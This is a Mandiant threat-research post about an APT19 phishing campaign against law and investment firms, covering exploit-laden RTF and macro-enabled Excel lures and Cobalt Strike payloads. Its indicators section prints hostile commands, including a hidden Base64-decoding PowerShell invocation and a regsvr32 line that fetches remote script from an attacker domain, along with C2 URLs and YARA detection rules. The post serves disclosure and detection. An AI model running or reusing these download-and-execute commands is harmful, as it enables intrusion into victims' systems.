# Reference for threat actor for "APT 19, Deep Panda, C0d0so0"

**Title**: Privileges and Credentials: Phished at the Request of Counsel | Mandiant

**Source**: https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html

## Content
Privileges and Credentials: Phished at the Request of Counsel | Mandiant   Skip to main content Mandiant is now part of Google Cloud. Learn More.         Platform   Solutions   Intelligence   Services   Resources   Company Mandiant AdvantageExplore our multi-vendor XDR platform, delivering Mandiant products and integrating with a range of leading security operations technology.Explore the platformarrow_forward Who's targeting you   Attack Surface Management Map your external environment   Breach Analytics for Chronicle Know what we know when we know it   Security Validation Validate controls are working properly   Threat Intelligence Access latest intel from the frontlines   Digital Threat Monitoring Visibility into deep, dark, and open web   Managed Defense Managed detection and response Mandiant SolutionsSolve your toughest cyber security challenges with combinations of products and services.Featured solutionsarrow_forwardBy use casearrow_forwardBy industryarrow_forward  Featured solutions   Proactive Exposure Management New!Reduce exposures before adversaries act   Government New!Protect national services and agencies   Digital Risk ProtectionPrioritize and focus on threats that matter   RansomwareIncrease resilience against ransomware and multifaceted extortion   Know Who is Targeting YouPrioritize threats that matter most   Know What Is ExposedIdentify attack surface exposures   Know If You Are PreparedTest and measure your cyber defense program   Know If You Have Been BreachedDetect and respond to breach activity quickly and effectively   Use Case   RansomwareIncrease resilience against multifaceted extortion   Cyber Risk ManagementAdvance your business approach to cyber security   Digital Risk ProtectionPrioritize and focus on threats that matter   Industrial ControlsStrengthen OT and ICS security   Insider ThreatsUncover and manage internal vulnerabilities   Skills GapClose gaps with training and access to expertise   Private Industry   Finance New!Extend your security posture and operationalize resilience   Manufacturing New!Protect against cyber security threats to maintain business continuity   Government   Election SecurityFocus on Election Infrastructure Protection   Government  New!Protect natural services and agencies Mandiant ServicesMitigate threats, reduce risk, and get back to business with the help of leading experts.Learn morearrow_forwardView all services (47)arrow_forward Schedule a consultation   Featured categories   Cyber Security Transformation Establish and activate cyber defenses   Incident Response Tackle breaches confidently   Strategic Readiness Increase resilience to risk   Technical Assurance Test your security program   Expertise On Demand Access to Mandiant Experts   Training   Browse courses Browse on-demand and live training   Mandiant Academy Train your teams to protect effectively Cyber Threat IntelligenceMandiant specializes in cyber threat intelligence, offering products, services, and more to support our mission to defend against cyber crime. Intelligence resourcesarrow_forward  Products   Threat Intelligence Access latest intel from the frontlines   Digital Threat Monitoring visibility into deep, dark, and open web   Services   Intelligence capability development build a comprehensive threat intelligence program   Intelligence Training Develop practical application skills   Executive Briefings Get live, interactive briefings from the frontlines   Advanced Intelligence Access Hire a dedicated analyst for your needs Resource CenterGet the latest insights from cyber security experts at the frontlines of threat intelligence and incident responseM-Trends 2023 reportarrow_forwardmWISEarrow_forward View all resourcesarrow_forward   Resource types   Mandiant Blog Expert perspectives and industry news   Podcasts Interviews, hot topics, and more   Customer Stories Case studies and customer testimonials   Reports Research from the frontlines   Webinars Livestreams and pre-recorded speaker events   Insights Cyber security concepts, methods, and more   Events Upcoming conferences and collaboration   Infographics Visualization of security research and process   Datasheets Information on Mandiant offerings and more   eBooks High-impact cyber security guides   White Papers Cyber security insights and technical expertise CompanyLearn more about us and our mission to help organizations defend against cyber crime.Learn morearrow_forward Contact us   Careers Life at Mandiant and open roles   Media Center Press releases and news mentions   Partners Ecosystem and resources   Elevate Empowering women in cyber security   Mandiant Gives Back Our commitment to a better future              Sign in to Advantage  en  expand_more   English Français Deutsch Italiano 日本 한국어 EspañolGet Started        Search   Submit search form    Search   Submit search form  PlatformMandiant Advantage OverviewSecurity ValidationAttack Surface ManagementThreat IntelligenceDigital Threat MonitoringManaged DefenseSolutionsProactive Exposure ManagementGovernmentRansomwareKnow Who is Targeting YouKnow What Is ExposedKnow If You Are PreparedKnow If You Have Been BreachedCyber Risk ManagementDigital Risk ProtectionOT/ICS SecurityInsider ThreatsCyber Security Skills GapFinanceManufacturingElection SecurityIntelligenceIntelligence resourcesThreat IntelligenceDigital Threat MonitoringIntelligence Capability DevelopmentIntelligence TrainingExecutive BriefingsAdvanced Intelligence AccessServicesServices OverviewIncident ResponseStrategic ReadinessCyber Security TransformationTechnical AssuranceView all Services (48)Mandiant AcademyFind a CourseExpertise On DemandResourcesResourcesMandiant BlogsCustomer StoriesWebinarsEventsPodcastsReportsInsightsDatasheetsInfographicsWhite PaperseBooksCompanyAbout MandiantCareersMedia CenterPartnersElevateMandiant Gives BackMobile Footer SectionSee what’s new at MandiantGet startedIncident Response HelpContact SalesSupportBlogTop Incident Response Contact sales Support   BlogSupportContact usreport_problemIncident Response Assistance   Breadcrumb Home Privileges and Credentials: Phished at the Request of Counsel   Threat Research Privileges and Credentials: Phished at the Request of CounselIan Ahl Jun 06, 20179 min read |    Last updated: Nov 29, 2022 SummaryIn May and June 2017, FireEye observed a phishing campaign targeting at least seven global law and investment firms. We have associated this campaign with APT19, a group that we assess is composed of freelancers, with some degree of sponsorship by the Chinese government.APT19 used three different techniques to attempt to compromise targets. In early May, the phishing lures leveraged RTF attachments that exploited the Microsoft Windows vulnerability described in CVE 2017-0199. Toward the end of May, APT19 switched to using macro-enabled Microsoft Excel (XLSM) documents. In the most recent versions, APT19 added an application whitelisting bypass to the XLSM documents. At least one observed phishing lure delivered a Cobalt Strike payload.As of the writing of this blog post, FireEye had not observed post-exploitation activity by the threat actors, so we cannot assess the goal of the campaign. We have previously observed APT19 steal data from law and investment firms for competitive economic purposes.This purpose of this blog post is to inform law firms and investment firms of this phishing campaign and provide technical indicators that their IT personnel can use for proactive hunting and detection.The EmailsAPT19 phishing emails from this campaign originated from sender email accounts from the "@cloudsend[.]net" domain and used a variety of subjects and attachment names. Refer to the Indicators of Compromise section for more details.The AttachmentsAPT19 leveraged Rich Text Format (RTF) and macro-enabled Microsoft Excel (XLSM) files to deliver their initial exploits. The following sections describe the two methods in further detail.RTF AttachmentsThrough the exploitation of the HTA handler vulnerability described in CVE-2017-1099, the observed RTF attachments download hxxp://tk-in-f156.2bunny[.]com/Agreement.doc. Unfortunately, this file was no longer hosted at tk-in-f156.2bunny[.]com for further analysis. Figure 1 is a screenshot of a packet capture showing one of the RTF files reaching out to hxxp://tk-in-f156.2bunny[.]com/Agreement.doc.Figure 1: RTF PCAPXLSM AttachmentsThe XLSM attachments contained multiple worksheets with content that reflected the attachment name. The attachments also contained an image that requested the user to “Enable Content”, which would enable macro support if it was disabled. Figure 2 provides a screenshot of one of the XLSM files (MD5:30f149479c02b741e897cdb9ecd22da7).Figure 2: Enable macrosOne of the malicious XLSM attachments that we observed contained a macro that:Determined the system architecture to select the correct path for PowerShellLaunched a ZLIB compressed and Base64 encoded command with PowerShell. This is a typical technique used by Meterpreter stagers.Figure 3 depicts the macro embedded within the XLSM file (MD5: 38125a991efc6ab02f7134db0ebe21b6).Figure 3: XLSX MacroFigure 4 contains the decoded output of the encoded text.Figure 4: Decoded ZLIB + Base64 payloadThe shellcode invokes PowerShell to issue a HTTP GET request for a random four (4) character URI on the root of autodiscovery[.]2bunny[.]com. The requests contain minimal HTTP headers since the PowerShell command is executed with mostly default parameters. Figure 5 depicts an HTTP GET request generated by the payload, with minimal HTTP headers.Figure 5: GET Request with minimal HTTP headersConverting the shellcode to ASCII and removing the non-printable characters provides a quick way to pull out network-based indicators (NBI) from the shellcode. Figure 6 shows the extracted NBIs.Figure 6: Decoded shellcodeFireEye also identified an alternate macro in some of the XLSM documents, displayed in Figure 7.Figure 7: Alternate macroThis macro uses Casey Smith’s “Squiblydoo” Application Whitelisting bypass technique to run the command in Figure 8.Figure 8: Application Whitelisting BypassThe command in Figure 8 downloads and launches code within an SCT file. The SCT file in the payload (MD5: 1554d6fe12830ae57284b389a1132d65) contained the code shown in Figure 9.Figure 9: SCT contentsFigure 10 provides the decoded script. Notice the “$DoIt” string, which is usually indicative of a Cobalt Strike payload.Figure 10: Decoded SCT contentsA quick conversion of the contents of the variable “$var_code” from Base64 to ASCII shows some familiar network indicators, shown in Figure 11.Figure 11: $var_code to ASCIISecond Stage PayloadOnce the XLSM launches its PowerShell command, it downloads a typical Cobalt Strike BEACON payload, configured with the following parameters:Process Inject Targets:%windir%\syswow64\rundll32.exe%windir%\sysnative\rundll32.exec2_user_agentsMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)Named Pipes\\%s\pipe\msagent_%xbeacon_interval60C2autodiscover.2bunny[.]com/submit.phpautodiscover.2bunny[.]com/IE9CompatViewList.xmlsfo02s01-in-f2.cloudsend[.]net/submit.phpsfo02s01-in-f2.cloudsend[.]net/IE9CompatViewList.xmlC2 PortTCP/80Figure 12 depicts an example of a BEACON C2 attempt from this payload.Figure 12: Cobalt Strike BEACON C2FireEye Product DetectionsThe following FireEye products currently detect and block the methods described above. Table 1 lists the current detection and blocking capabilities by product.Detection NameProductActionNotesSUSPICIOUS POWERSHELL USAGE (METHODOLOGY)HXDetectXSLM Macro launchGen:Variant.Application.HackTool.CobaltStrike.1HXDetectXSLM Macro launchMalware ObjectHXDetectBEACON written to diskBackdoor.BEACONNXBlock*BEACON CallbackFE_Malformed_RTFEX/ETP/NXBlock*RTFMalware.Binary.rtfEX/ETP/NXBlock*RTFMalware.BinaryEX/ETP/NXBlock*RTFMalware.Binary.xlsxEX/ETP/NXBlock*XSLMTable 1: Detection review*Appliances must be configured for block mode.RecommendationsFireEye recommends organizations perform the following steps to mitigate the risk of this campaign:Microsoft Office users should apply the patch from Microsoft as soon as possible, if they have not already installed it.Search historic and future emails that match the included indicators of compromise.Review web proxy logs for connections to the included network based indicators of compromise.Block connections to the included fully qualified domain names.Review endpoints for the included host based indicators of compromise.Indicators of CompromiseThe following section provides the IOCs for the variants of the phishing emails and malicious payloads that FireEye has observed during this campaign.Email SendersPressReader <infodept@cloudsend[.]net>Angela Suh <angela.suh@cloudsend[.]net>Ashley Safronoff <ashley.safronoff@cloudsend[.]net>Lindsey Hersh <lindsey.hersh@cloudsend[.]net>Sarah Roberto sarah.roberto@cloudsend[.]netnoreply@cloudsend[.]netEmail Subject LinesMacron Denies Authenticity Of Leak, French Prosecutors Open ProbeMacron Document Leaker Releases New Images, Promises More InformationAre Emmanuel Macron's Tax Evasion Documents Real?Time AllocationVacancy Reportchina paper table and graphresults with zeros – some ready not all finishedMacron Leaks contain secret plans for the islamisation of France and EuropeAttachment NamesMacron_Authenticity.doc.rtfMacron_Information.doc.rtfUS and EU Trade with China and China CA.xlsmTables 4 5 7 Appendix with zeros.xlsmProject Codes - 05.30.17.xlsmWeekly Vacancy Status Report 5-30-15.xlsmMacron_Tax_Evasion.doc.rtfMacron_secret_plans.doc.rtfNetwork Based Indicators (NBI)lyncdiscover.2bunny[.]comautodiscover.2bunny[.]comlyncdiscover.2bunny[.]com:443/Autodiscover/AutodiscoverService/lyncdiscover.2bunny[.]com/Autodiscoverautodiscover.2bunny[.]com/K5omsfo02s01-in-f2.cloudsend[.]net/submit.phpsfo02s01-in-f2.cloudsend[.]net/IE9CompatViewList.xmltk-in-f156.2bunny[.]comtk-in-f156.2bunny[.]com/Agreement.doc104.236.77[.]169138.68.45[.]9162.243.143[.]145Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)tf-in-f167.2bunny[.]com:443 (*Only seen in VT not ITW)Host Based Indicators (HBI)RTF MD5 hash values0bef39d0e10b1edfe77617f494d733a80e6da59f10e1c4685bb5b35a30fc8fb6cebd0e9e05749665d893e78c452607e2XLSX MD5 hash values38125a991efc6ab02f7134db0ebe21b63a1dca21bfe72368f2dd46eb4d9b48c430f149479c02b741e897cdb9ecd22da7BEACON and Meterpreter payload MD5 hash valuesbae0b39197a1ac9e24bdf9a9483b18ea1151619d06a461456b310096db6bc548Process arguments, named pipes, and file pathspowershell.exe -NoP -NonI -W Hidden -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("<base64 blob>")regsvr32.exe /s /n /u /i:hxxps://lyncdiscover.2bunny.com/Autodiscover scrobj.dll\\<ip>\pipe\msagent_<4 digits>C:\Documents and Settings\<user>\Local Settings\Temp\K5om.dll (4 character DLL based on URI of original GET request)Yara Rulesrule FE_LEGALSTRIKE_MACRO {       meta:version=".1"       filetype="MACRO"       author="Ian.Ahl@fireeye.com @TekDefense"       date="2017-06-02"       description="This rule is designed to identify macros with the specific encoding used in the sample 30f149479c02b741e897cdb9ecd22da7."strings:       // OBSFUCATION       $ob1 = "ChrW(114) & ChrW(101) & ChrW(103) & ChrW(115) & ChrW(118) & ChrW(114) & ChrW(51) & ChrW(50) & ChrW(46) & ChrW(101)" ascii wide       $ob2 = "ChrW(120) & ChrW(101) & ChrW(32) & ChrW(47) & ChrW(115) & ChrW(32) & ChrW(47) & ChrW(110) & ChrW(32) & ChrW(47)" ascii wide       $ob3 = "ChrW(117) & ChrW(32) & ChrW(47) & ChrW(105) & ChrW(58) & ChrW(104) & ChrW(116) & ChrW(116) & ChrW(112) & ChrW(115)" ascii wide       $ob4 = "ChrW(58) & ChrW(47) & ChrW(47) & ChrW(108) & ChrW(121) & ChrW(110) & ChrW(99) & ChrW(100) & ChrW(105) & ChrW(115)" ascii wide       $ob5 = "ChrW(99) & ChrW(111) & ChrW(118) & ChrW(101) & ChrW(114) & ChrW(46) & ChrW(50) & ChrW(98) & ChrW(117) & ChrW(110)" ascii wide       $ob6 = "ChrW(110) & ChrW(121) & ChrW(46) & ChrW(99) & ChrW(111) & ChrW(109) & ChrW(47) & ChrW(65) & ChrW(117) & ChrW(116)" ascii wide       $ob7 = "ChrW(111) & ChrW(100) & ChrW(105) & ChrW(115) & ChrW(99) & ChrW(111) & ChrW(118) & ChrW(101) & ChrW(114) & ChrW(32)" ascii wide       $ob8 = "ChrW(115) & ChrW(99) & ChrW(114) & ChrW(111) & ChrW(98) & ChrW(106) & ChrW(46) & ChrW(100) & ChrW(108) & ChrW(108)" ascii wide       $obreg1 = /(\w{5}\s&\s){7}\w{5}/       $obreg2 = /(Chrw\(\d{1,3}\)\s&\s){7}/       // wscript       $wsobj1 = "Set Obj = CreateObject(\"WScript.Shell\")" ascii wide       $wsobj2 = "Obj.Run " ascii widecondition:        (              (                      (uint16(0) != 0x5A4D)              )              and              (                      all of ($wsobj*) and 3 of ($ob*)                      or                      all of ($wsobj*) and all of ($obreg*)              )       )} rule FE_LEGALSTRIKE_MACRO_2 {       meta:version=".1"       filetype="MACRO"       author="Ian.Ahl@fireeye.com @TekDefense"       date="2017-06-02"       description="This rule was written to hit on specific variables and powershell command fragments as seen in the macro found in the XLSX file3a1dca21bfe72368f2dd46eb4d9b48c4."strings:       // Setting the environment       $env1 = "Arch = Environ(\"PROCESSOR_ARCHITECTURE\")" ascii wide       $env2 = "windir = Environ(\"windir\")" ascii wide       $env3 = "windir + \"\\syswow64\\windowspowershell\\v1.0\\powershell.exe\"" ascii wide       // powershell command fragments       $ps1 = "-NoP" ascii wide       $ps2 = "-NonI" ascii wide       $ps3 = "-W Hidden" ascii wide       $ps4 = "-Command" ascii wide       $ps5 = "New-Object IO.StreamReader" ascii wide       $ps6 = "IO.Compression.DeflateStream" ascii wide       $ps7 = "IO.MemoryStream" ascii wide       $ps8 = ",$([Convert]::FromBase64String" ascii wide       $ps9 = "ReadToEnd();" ascii wide       $psregex1 = /\W\w+\s+\s\".+\"/condition:       (              (                      (uint16(0) != 0x5A4D)              )              and              (                      all of ($env*) and 6 of ($ps*)                      or                      all of ($env*) and 4 of ($ps*) and all of ($psregex*)              )       )} rule FE_LEGALSTRIKE_RTF {    meta:        version=".1"        filetype="MACRO"        author="joshua.kim@FireEye.com"        date="2017-06-02"        description="Rtf Phishing Campaign leveraging the CVE 2017-0199 exploit, to point to the domain 2bunnyDOTcom"    strings:        $header = "{\\rt"        $lnkinfo = "4c0069006e006b0049006e0066006f"        $encoded1 = "4f4c45324c696e6b"        $encoded2 = "52006f006f007400200045006e007400720079"        $encoded3 = "4f0062006a0049006e0066006f"        $encoded4 = "4f006c0065"        $http1 = "68{"        $http2 = "74{"        $http3 = "07{"        // 2bunny.com        $domain1 = "32{\\"        $domain2 = "62{\\"        $domain3 = "75{\\"        $domain4 = "6e{\\"        $domain5 = "79{\\"        $domain6 = "2e{\\"        $domain7 = "63{\\"        $domain8 = "6f{\\"        $domain9 = "6d{\\"        $datastore = "\\*\\datastore"    condition:        $header at 0 and all of them}AcknowledgementsJoshua Kim, Nick Carr, Gerry Stellatos, Charles Carmakal, TJ Dahms, Nick Richard, Barry Vengerik, Justin Prosco, Christopher Glyer Link to RSS feedPrepare for 2024's cybersecurity landscape.Get the Google Cloud Cybersecurity Forecast 2024 report to explore the latest trends on the horizon. Download now  Have questions? Let's talk.Mandiant experts are ready to answer your questions. Contact Us  Follow us Footer Mandiant Advantage Platform Platform Overview Security Validation Attack Surface Management Threat Intelligence Digital Threat Monitoring Managed Defense Solutions Proactive Exposure Management Ransomware Industrial Controls & OT Cyber Risk Management Digital Risk Protection Insider Threats Cyber Security Skills Gap Election Security Government Cyber Security Manufacturing Cyber Threat Visibility Attack Surface Visibility Cyber Preparedness Detection and Response Financial Services Cyber Security Services Services Overview Incident Response Strategic Readiness Cyber Security Transformation Technical Assurance View all Services (48) Expertise on Demand Mandiant Academy Overview Education Formats Upcoming Courses On-Demand Courses Certifications ThreatSpace Cyber Range Free Course Sneak Peaks Resources Resource Center Blog Podcasts  Customer Stories Reports Webinars Insights eBooks Infographics White Papers Datasheets Company About Us Careers Events Media Center Partners Partners Overview Technology Partners Cyber Risk Partners Service Partners Channel Partners Partner Portal Connect with Mandiant Contact Us Report an Incident Customer Support Customer Success Media Inquiries © Copyright 2024 Mandiant. All rights reserved.Bottom Website Privacy Policy Terms & Conditions Compliance Site Map  